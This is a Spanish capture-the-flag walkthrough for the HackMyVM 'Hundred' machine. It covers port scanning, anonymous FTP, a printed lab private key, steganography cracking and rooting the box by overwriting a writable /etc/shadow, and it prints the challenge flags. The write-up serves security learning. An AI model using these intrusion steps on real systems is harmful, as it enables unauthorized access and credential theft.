---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Hundred HackMyVM (Intermediate - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-08 10:55 EDT
Nmap scan report for 192.168.28.16
Host is up (0.00062s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxrwxrwx    1 0        0             435 Aug 02  2021 id_rsa [NSE: writeable]
| -rwxrwxrwx    1 1000     1000         1679 Aug 02  2021 id_rsa.pem [NSE: writeable]
| -rwxrwxrwx    1 1000     1000          451 Aug 02  2021 id_rsa.pub [NSE: writeable]
|_-rwxrwxrwx    1 0        0             187 Aug 02  2021 users.txt [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.28.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 ef:28:1f:2a:1a:56:49:9d:77:88:4f:c4:74:56:0f:5c (RSA)
|   256 1d:8d:a0:2e:e9:a3:2d:a1:4d:ec:07:41:75:ce:47:0e (ECDSA)
|_  256 06:80:3b:fc:c5:f7:7d:c5:58:26:83:c4:f7:7e:a3:d9 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:14:0C:94 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.32 seconds
```

Veremos que hay un `FTP` si intentamos entrar como anonimo, veremos que nos deja y veremos lo siguiente:

```shell
ftp anonymous@<IP>
```

Info:

```
229 Entering Extended Passive Mode (|||38524|)
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0             435 Aug 02  2021 id_rsa
-rwxrwxrwx    1 1000     1000         1679 Aug 02  2021 id_rsa.pem
-rwxrwxrwx    1 1000     1000          451 Aug 02  2021 id_rsa.pub
-rwxrwxrwx    1 0        0             187 Aug 02  2021 users.txt
226 Directory send OK.
```

Veremos varias cosas interesantes, entre ellas que hay una clave `PEM` pero no sabemos de que usuario puede ser, por lo que nos vamos a descargar los siguiente archivos.

```shell
get id_rsa
get users.txt
get id_rsa.pem
```

Pero vemos que tenemos una lista de usuarios:

```
--- SNIP ---
noname
roelvb
ch4rm
marcioapm
isen
sys7em
chicko
tasiyanci
luken
alienum
linked
tatayoyo
0xr0n1n
exploiter
kanek180
cromiphi
softyhack
b4el7d
val1d
--- SNIP ---

Thanks!
hmv
```

Ahora si leemos la `id_rsa` veremos lo siguiente:

```
 / \
    / _ \
   | / \ |
   ||   || _______
   ||   || |\     \
   ||   || ||\     \
   ||   || || \    |
   ||   || ||  \__/
   ||   || ||   ||
    \\_/ \_/ \_//
   /   _     _   \
  /               \
  |    O     O    |
  |   \  ___  /   |                           
 /     \ \_/ /     \
/  -----  |  --\    \
|     \__/|\__/ \   |
\       |_|_|       /
 \_____       _____/
       \     /
       |     |
-------------------------
```

Parece que es un `trolleo` por lo que es falso, pero si leemos el siguiente:

> id\_rsa.pem

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwsrHORyA+mG6HS9ZmZwzPmKHrHhA0/kKCwNjUG8rmPVupv73
mUsewpoGvYB9L9I7pUAsMscAb5MVo89d4b0z2RnXDD1fh6mKlTJmcNwWCnA1PgD+
OwqewshpkCBhCV6O2P6dktfA8UI/uqF6uT4QISU4ksriN16cOm/89jHadetB8dCe
h3Rx6HrFNccY8aiDRSA9meqz7YGE2+lJ/NtwtndUkzzxKxuKC6z4gG780tZHhg83
xVwZ9bxPyHfGqHWmV4yGsAgp7mot7pg9VzffnP6DAVnbReDDbhNLcnfVXEkBv8SQ
L7OFIiKxJpoa1ADqGffA5LOPFdYKbbCFMictQQIDAQABAoIBAE4Q6IDp/ILcEbPK
mzUl1Z+l60visdCCGVVKmU3OEAHwMtV4j5B++6fwBM2Dpig5MDBNJKmA+Zq9rsmE
vNJQemwCoB3Gpvd+qgybM1T9z1OFnsDnsvvEiNX1beEWKO2RWNx8RnhoQWovK81H
FCETT3GJMkAaUUjxgNkmspGUb0IcP4YR61jpNy8thMLz8FQV8XqNSf4DSd9+8wrm
FBFDFzso6zcBtsY6/nDueaVfLsequU1Fdhh3itC6rPXync/EWN0HJtaiKEVAytYE
cvl1hVpRVhGZGjPqNQSPcknO0K2b22anRoiSpBoCzaopbSZHySFgcZM8oxGgw35j
YpS1ULUCgYEA+1Se5s4AzsOX/3RRwwF9Was//oHU1N2JnJRetF9tjeFu8MEMnSec
a3bcPy+CZHB8oVnoyh647IObzPUjCgMxdyTLdfGmQ8RgzXhwYeQRe+ethrT/Ra26
7m+R+3838k5ZTKnwjBPreV/i2AmwZYDPT2S5q5b7m5Cr4QTfsaScaKsCgYEAxmk/
xzu2XO8YmE+8R62nWdLPMaj4E5IPkT3uCA8G24KGSSyK29OGZ02RI8qxWkdqMxKJ
rTDrQJ/4oU6108Vhay0tyFswbNn0ymlHAhPKxXNr0xHkC6rCnDEnn6W7bspTxxyk
9OUtl2UemtnEKRm3qu9Rc1qLFW0/Zhxw3ovgWcMCgYEAka6HPPoD9dXicSyXiBWA
900QlxHisFCJx70o+ByogClACUWdbirbvF71Y5rCVj3twAlBqocMYewXj0I4wUEA
lzM4zHD6EyXthqxdWCC/EbdFGmQn49fEFxmM4N7pKwbHNGz9BfU19PDjqJ5VJUD4
6ehUx2WJCq9dMd2FXI8yKmkCgYAMBBnBtiMQM8a4irOrX5/v961mo4YKoWDh+e8t
e8N9jcUWL2VldMUCApeUpFTjU8nht/CwlXLZ4hZLppmqbpy8weqw5JzlKroBfCi5
vnscRCY2jTHTZw8MKInuyDm2tvgl6d0vm6WMMqqM1D1mA9G0v3OeWdBshsY9J+HK
CIyYwwKBgQDEXoZ+lZKyPUBSgcE+b52U2Dj9GAPKPUDZpsCbUebftZknOk/HelF1
wiWWDjni1ILVSfWIR4/nvosJPa+39WDv+dFt3bJdcUA3SL2acW3MGVPC6abZWwSo
izXrZm8h0ZSuXyU/uuT3BCJt77HyN2cPZrqccPwanS9du6zrX0u2yQ==
-----END RSA PRIVATE KEY-----
```

Vemos que este si parece que sirve.

Ahora vamos a entrar a la pagina web que esta alojada en el puerto `80`, que si entramos veremos simplemente una imagen, pero si inspeccionamos la pagina veremos lo siguiente:

```
<style>
.center {
  display: block;
  margin-left: auto;
  margin-right: auto;
  key: h4ckb1tu5.enc;
  width: 50%;
}
</style>

<img src="[logo.jpg](view-source:http://192.168.28.16/logo.jpg)" class="center"> 
<h1>Thank you ALL!</h1>
<h1>100 f*cking VMs!!</h1>

<!-- l4nr3n, nice dir.-->
```

Vemos que en el codigo de `CSS` hay un parametro que no existe lo que parece ser una contraseña o algo encriptado:

```
key: h4ckb1tu5.enc;
```

Despues vemos que hay un directorio llamado `l4nr3n` pero no existe, pero si probamos como ruta `h4ckb1tu5.enc` veremos que se nos descarga dicho archivo:

```
URL = http://<IP>/h4ckb1tu5.enc
```

Si lo intentamos leer veremos que esta encriptado, por lo que vamos a probar a desencriptarlo de la siguiente forma:

```shell
openssl pkeyutl -in h4ckb1tu5.enc -out archivo_descifrado.txt -decrypt -inkey id_rsa.pem
```

Vamos a probar a descifrarlo con la clave privada que obtuvimos `.pem`, esto nos lo decodificara de forma correcta y veremos lo siguiente:

```
/softyhackb4el7dshelldredd
```

Vemos que puede ser un `directorio`, si probamos a meterlo veremos lo siguiente:

```
URL = http://<IP>/softyhackb4el7dshelldredd
```

Veremos esto:

```
Hi boss. Is there --> ...
```

Vemos que no hay nada interesante, por lo que vamos a realizar un poco de `fuzzing`.

### Gobuster

```shell
gobuster dir -u http://<IP>/softyhackb4el7dshelldredd/ -w <WORDLIST> -x html,php,txt -t 100 -k -r 
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.28.16/softyhackb4el7dshelldredd/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                ../Downloads/combined_words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/id_rsa               (Status: 200) [Size: 1876]
/index.html           (Status: 200) [Size: 26]
/index.html           (Status: 200) [Size: 26]
/.                    (Status: 200) [Size: 26]
Progress: 343102 / 513392 (66.83%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 343364 / 513392 (66.88%)
===============================================================
Finished
===============================================================
```

Vemos que nos descubrio el archivo `id_rsa` que este si puede ser el real, por lo que nos lo vamos a descaragar:

```shell
wget http://<IP>/softyhackb4el7dshelldredd/id_rsa
```

Ahora si lo leemos veremos que si es un `id_rsa` por lo que le pondremos los permisos necesarios.

```shell
chmod 600 id_rsa
```

Ahora probaremos a conectarnos con un usuario que nos llamo bastante la atencion en la lista de `users.txt` llamado `hmv`:

```shell
ssh -i id_rsa hmv@<IP>
```

Info:

```
Enter passphrase for key 'id_rsa':
```

Nos pedira que ingresemos la contraseña de la clave `PEM` pero no la tendremos, lo unico que tenemos es la imagen de la pagina web, vamos a realizarle `esteganografía` con la siguiente herramienta:

## Escalate user hmv

### stegseek

```shell
stegseek logo.jpg users.txt
```

Vamos a pasarle como diccionario de palabras el archivo `users.txt` que obtuvimos mediante el `FTP` y veremos lo siguiente:

```
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "cromiphi"
[i] Original filename: "toyou.txt".
[i] Extracting to "logo.jpg.out".
```

Veremos que ha funcionado y obtendremos el archivo llamado `logo.jpg.out` y si lo leemos veremos lo siguiente:

```shell
cat logo.jpg.out
```

Info:

```
d4t4s3c#1
```

Vamos a probar dicha palabra si fuera la contraseña de la clave `PEM`.

### SSH

```shell
ssh -i id_rsa hmv@<IP>
```

Metemos como contraseña `d4t4s3c#1` y veremos que estamos dentro.

Info:

```
Enter passphrase for key 'id_rsa': 
Linux hundred 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Aug  2 06:43:27 2021 from 192.168.1.51
hmv@hundred:~$ whoami
hmv
```

Vamos a leer la `flag` del usuario.

> user.txt

```
HMV100vmyay
```

## Escalate Privileges

Si listamos los permisos del archivo `shadow`:

```shell
ls -la /etc/shadow
```

Info:

```
-rwxrwx-wx 1 root shadow 963 Aug  2  2021 /etc/shadow
```

Vemos que podemos editar dicho archivo, por lo que haremos lo siguiente:

Primero en nuestro `host` cifrariamos una contraseña:

```shell
openssl passwd -6 '1234'
```

Info:

```
$6$qWPqGmtdE0tOBVd8$LGAi14146AiTqP5JppFa9yHmqzIGAjKX9Qex8p3sD7u8ylf0jcc9oFenvrmWYzm7pZ7X4Ja4.Iy6Ttlqgy1l90
```

Y con dicha contraseña cifrada, lo montaremos de tal forma:

```shell
echo 'root:$6$qWPqGmtdE0tOBVd8$LGAi14146AiTqP5JppFa9yHmqzIGAjKX9Qex8p3sD7u8ylf0jcc9oFenvrmWYzm7pZ7X4Ja4.Iy6Ttlqgy1l90:20061:0:99999:7:::' > /etc/shadow
```

Echo esto, probaremos hacer lo siguiente:

```shell
su root
```

Metemos como contraseña `1234` y veremos que funciona.

Info:

```
root@hundred:/etc# whoami
root
```

Por lo que leeremos la `flag` de `root`.

> root.txt

```
HMVkeephacking
```
